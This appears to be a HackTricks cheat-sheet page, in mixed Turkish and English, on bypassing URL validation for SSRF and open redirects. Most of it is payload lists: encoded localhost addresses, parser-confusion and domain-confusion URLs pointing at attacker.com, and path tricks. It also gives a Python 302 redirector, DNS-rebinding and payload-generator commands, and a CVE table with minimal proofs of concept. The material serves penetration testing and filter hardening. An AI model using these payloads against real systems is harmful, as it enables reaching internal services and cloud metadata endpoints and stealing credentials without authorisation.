# URL Format Bypass

{{#include ../../banners/hacktricks-training.md}}

### Localhost

<details>
<summary>Localhost payloads</summary>
```bash
# Localhost
0 # Yes, just 0 is localhost in Linux
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://①②⑦.⓪.⓪.⓪

# CIDR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127。0。0。1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Mixed encodings bypass
169.254.43518 -> Partial Decimal (Class B) format combines the third and fourth parts of the IP address into a decimal number
0xA9.254.0251.0376 -> hexadecimal, decimal and octal

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# https://www.silisoftware.com/tools/ipconverter.php

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```
</details>

![](<../../images/image (776).png>)

Bu **Burp extension** [**Burp-Encode-IP**](https://github.com/e1abrador/Burp-Encode-IP) IP formatı atlatmalarını uygular.

### Alan Adı Ayrıştırıcı

<details>
<summary>Alan adı ayrıştırıcı atlatmaları</summary>
```bash
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attacker。com
ⒶⓉⓉⒶⒸⓀⒺⓡ.Ⓒⓞⓜ
# double encoded fragment to bypass split("#"): attacker.com%2523@victim
```
</details>
```
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾
⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗
⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰
⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ
Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ
ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```
### Domain Confusion

<details>
<summary>Domain confusion payloads</summary>
```bash
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters
https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com
# colon + backslash confusion (CVE-2025-0454 in autogpt)
http://localhost:\@google.com/../

# On each IP position try to put 1 attackers domain and the others the victim domain
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

# Parameter pollution
next={domain}&next=attacker.com
```
</details>

### Yollar ve Uzantılar Bypass

URL'in bir yol veya uzantı ile bitmesi ya da bir yol içermesi gerekiyorsa, aşağıdaki bypass yöntemlerinden birini deneyebilirsiniz:
```
https://metadata/vulnerable/path#/expected/path
https://metadata/vulnerable/path#.extension
https://metadata/expected/path/..%2f..%2f/vulnerable/path
```
### Fuzzing

Araç [**recollapse**](https://github.com/0xacb/recollapse), verilen bir girdiden varyasyonlar üretebilir ve kullanılan regex'i atlatmayı deneyebilir. Daha fazla bilgi için [**bu yazıya**](https://0xacb.com/2022/11/21/recollapse/) da bakın.

### Otomatik Özel Wordlists

Portswigger'ın [**URL validation bypass cheat sheet** webapp'ine](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet) göz atın; burada izin verilen host'u ve saldırganın host'unu girebilir ve sizin için denenecek bir URL listesi oluşturur. Ayrıca URL'i bir parametrede, bir Host header'ında veya bir CORS header'ında kullanıp kullanamayacağınızı da dikkate alır.


{{#ref}}
https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
{{#endref}}

### Yönlendirme ile Bypass

Sunucu, bir SSRF'nin **orijinal isteğini filtreliyor** olabilir fakat bu isteğe verilebilecek olası bir **redirect** yanıtını **filtrelemiyor** olabilir.\
Örneğin, `url=https://www.google.com/` ile SSRF'ye duyarlı bir sunucu `url` parametresini **filtreliyor** olabilir. Ancak yönlendirmek istediğiniz yere [302 ile cevap veren bir python server](https://pastebin.com/raw/ywAUhFrv) kullanırsanız, 127.0.0.1 gibi **filtrelenmiş IP adreslerine erişebilir** veya hatta gopher gibi filtrelenmiş **protokollere** erişim sağlayabilirsiniz.\
[Bu rapora göz atın.](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)

<details>
<summary>SSRF testi için basit yönlendirici</summary>
```python
#!/usr/bin/env python3

#python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
print("Usage: {} <port_number> <url>".format(sys.argv[0]))
sys.exit()

class Redirect(BaseHTTPRequestHandler):
def do_GET(self):
self.send_response(302)
self.send_header('Location', sys.argv[2])
self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
</details>

### DNS rebinding bypass (2025+)

Even when an SSRF filter performs a **single DNS resolution before sending the HTTP request**, iç HTTP isteği gönderilmeden önce domain'i lookup ile connection arasında yeniden bind ederek iç hostlara hala erişebilirsiniz:

1. Point `victim.example.com` to a public IP so it passes the allow‑list / CIDR check.
2. Çok düşük bir TTL servis edin (veya kontrolünüzdeki authoritative bir sunucu kullanın) ve gerçek istek yapılmadan hemen önce domain'i `127.0.0.1` veya `169.254.169.254` olarak yeniden bind edin.
3. Tools like **Singularity** (`nccgroup/singularity`) authoritative DNS + HTTP sunucusunu otomatikleştirir ve hazır payload'lar içerir. Örnek çalıştırma: `python3 singularity.py --lhost <your_ip> --rhost 127.0.0.1 --domain rebinder.test --http-port 8080`.

This technique was used in 2025 to bypass the BentoML "safe URL" patch and similar single‑resolve SSRF filters.

### Açıklanan Hileler

#### Backslash-trick

The _backslash-trick_ [WHATWG URL Standard](https://url.spec.whatwg.org/#url-parsing) ile [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#appendix-B) arasındaki bir farkı kullanır. RFC3986 URI'lar için genel bir çerçeve iken, WHATWG web URL'lerine özgüdür ve modern tarayıcılar tarafından benimsenmiştir. Ana fark, WHATWG standardının backslash (`\`) karakterini forward slash (`/`) ile eşdeğer saymasıdır; bu durum URL'ların nasıl parse edildiğini etkiler ve özellikle hostname'den path'e geçişin işaretlenmesini değiştirir.

![https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec_difference.jpg](https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec_difference.jpg)

#### Left square bracket

Kullanıcı bilgisi segmentindeki “left square bracket” karakteri `[` Spring’s UriComponentsBuilder'ının tarayıcılardan farklı bir hostname değeri döndürmesine neden olabilir: [https://example.com\[@attacker.com](https://portswigger.net/url-cheat-sheet#id=1da2f627d702248b9e61cc23912d2c729e52f878)

#### Diğer Karışıklıklar

![https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](<../../images/image (600).png>)

görüntü kaynağı [https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/)

#### IPv6 Zone Identifier (%25) Trick

RFC 6874'ü destekleyen modern URL parser'ları *link-local* IPv6 adreslerinin bir percent işaretinden sonra bir **zone identifier** içermesine izin verir. Bazı security filter'lar bu sözdiziminden habersizdir ve sadece köşeli parantez içindeki IPv6 literal'lerini temizler; bu da aşağıdaki payload'un iç arayüze ulaşmasına izin verebilir:
```text
http://[fe80::1%25eth0]/          # %25 = encoded '%', interpreted as fe80::1%eth0
http://[fe80::a9ff:fe00:1%25en0]/ # Another example (macOS style)
```
If the target application validates that the host is *not* `fe80::1` but stops parsing at the `%`, it may incorrectly treat the request as external. Always normalise the address **before** any security decision or strip the optional zone id entirely.

### Son Kütüphane Ayrıştırma CVE'leri (2022–2026)

Bir dizi yaygın framework, yukarıda listelenen numaralarla URL doğrulaması atlatıldığında SSRF için sömürülebilen hostname uyuşmazlığı sorunları yaşadı:

| Yıl | CVE | Bileşen | Hata özeti | Minimal PoC |
|------|-----|-----------|--------------|-------------|
| 2025 | CVE-2025-0454 | Python `requests` + `urllib.parse` (autogpt) | `http://localhost:\\@google.com/../` üzerindeki ayrıştırma uyuşmazlığı, allow‑list'lerin hostun `google.com` olduğunu düşünmesine izin verirken istek `localhost`'a gidiyor. | `requests.get("http://localhost:\\@google.com/../")` |
| 2025 | CVE-2025-2691 | Node package `nossrf` | SSRF'yi engellemesi amaçlanmış kütüphane sadece orijinal hostname'i kontrol ediyor, **çözümlenmiş IP'yi** kontrol etmiyor; bu da özel aralıklara çözümlenen hostnamelere izin veriyor. | `curl "http://trusted.example" --resolve trusted.example:80:127.0.0.1` |
| 2024 | CVE-2024-29415 | Node `ip` package | `isPublic()` dotted‑octal / kısa biçimli localhost'u (ör. `0127.0.0.1`, `127.1`) kamu olarak yanlış sınıflandırdı; filtrelerin iç hedefleri kabul etmesine izin verdi. | `ip.isPublic('0127.0.0.1')` returns true on vulnerable versions |
| 2024 | CVE-2024-3095 | Langchain WebResearchRetriever | Host filtresi yoktu; AI ajanlarından gelen GET istekleri IMDS/localhost'a ulaşabiliyordu. | User‑controlled URL inside `WebResearchRetriever` |
| 2024 | CVE-2024-22243 / ‑22262 | Spring `UriComponentsBuilder` | `[` kullanıcı bilgisi içinde Spring ile tarayıcılar tarafından farklı ayrıştırıldı, allow‑list atlatmaya izin verdi. | `https://example.com\[@internal` |
| 2023 | CVE-2023-27592 | **urllib3** <1.26.15 | Ters eğik çizgi karışıklığı, `http://example.com\\@169.254.169.254/` gibi örneklerin `@` ile bölünen host filtrelerini atlatmasına izin verdi. | — |
| 2022 | CVE-2022-3602 | OpenSSL | İsim sonuna `.` eklendiğinde hostname doğrulaması atlandı (noktasız domain karışıklığı). | — |

### Payload üretim yardımcıları (2024+)

Büyük özel kelime listelerini elle oluşturmak zahmetlidir. Açık kaynak araç **SSRF-PayloadMaker** (Python 3) artık karışık kodlamalar, zorunlu HTTP düşürme ve ters eğik çizgi varyantları dahil olmak üzere *80 k+* host karıştırma kombinasyonunu otomatik olarak oluşturabiliyor:
```bash
# Generate every known bypass that transforms the allowed host example.com to attacker.com
python3 ssrf_maker.py --allowed example.com --attacker attacker.com -A -o payloads.txt
```
Elde edilen liste doğrudan Burp Intruder veya `ffuf`'e verilebilir.

## Referanslar

- [https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25](https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)
- [https://portswigger.net/research/new-crazy-payloads-in-the-url-validation-bypass-cheat-sheet](https://portswigger.net/research/new-crazy-payloads-in-the-url-validation-bypass-cheat-sheet)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-22243](https://nvd.nist.gov/vuln/detail/CVE-2024-22243)
- [https://github.com/hsynuzm/SSRF-PayloadMaker](https://github.com/hsynuzm/SSRF-PayloadMaker)
- [https://medium.com/%40narendarlb123/1-cve-2025-0454-autogpt-ssrf-via-url-parsing-confusion-921d66fafcbe](https://medium.com/%40narendarlb123/1-cve-2025-0454-autogpt-ssrf-via-url-parsing-confusion-921d66fafcbe)
- [https://www.tenable.com/blog/how-tenable-bypassed-patch-for-bentoml-ssrf-vulnerability-CVE-2025-54381](https://www.tenable.com/blog/how-tenable-bypassed-patch-for-bentoml-ssrf-vulnerability-CVE-2025-54381)

{{#include ../../banners/hacktricks-training.md}}
